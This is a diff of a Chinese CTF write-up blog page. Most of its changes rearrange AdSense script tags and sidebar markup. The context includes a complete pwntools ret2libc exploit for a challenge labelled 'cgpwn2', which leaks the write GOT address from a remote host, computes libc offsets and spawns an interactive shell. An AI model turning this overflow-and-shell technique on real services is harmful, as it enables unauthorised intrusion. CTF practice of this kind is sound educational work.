@@ -11,6 +11,8 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
   <link rel="mask-icon" href="/images/logo.svg" color="#222">
   <meta name="google-site-verification" content="eaKNHevzJD712W6CICpiQ4_TgpzOgFr3dBKOwg7Hqs4">
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
 
 <link rel="stylesheet" href="/css/main.css">
 
@@ -164,7 +166,8 @@
         </div>
       </div>
     </div>
-
+  </aside>
+  <div class="sidebar-dimmer">
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
      crossorigin="anonymous"></script>
 <!-- sidebar -->
@@ -177,9 +180,7 @@
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
-
-  </aside>
-  <div class="sidebar-dimmer"></div>
+  </div>
 
 
     </header>
@@ -332,20 +333,6 @@ dest所在的栈长这样：<br>
 <p>参考：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLngxMHNlYy5vcmcvcHduL2ZtdHN0ci9mbXRzdHJfZXhwbG9pdC8=">https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/<i class="fa fa-external-link-alt"></i></span></p>
 <h3 id="cgpwn2">cgpwn2</h3>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">39614</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">a = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;4&#x27;</span>*<span class="number">4</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0x0804844B</span>) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">10</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">payload = <span class="string">&#x27;0&#x27;</span>*<span class="number">0x8c</span> + p32(addr-<span class="number">0x99a80</span>) + <span class="string">&#x27;1&#x27;</span>*<span class="number">4</span> + p32(addr+<span class="number">0x84c6b</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><!-- flag of hidden posts -->
-
-      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
-     crossorigin="anonymous"></script>
-<!-- sidebar -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-9943095847270020"
-     data-ad-slot="5504766755"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
     </div>
 
     
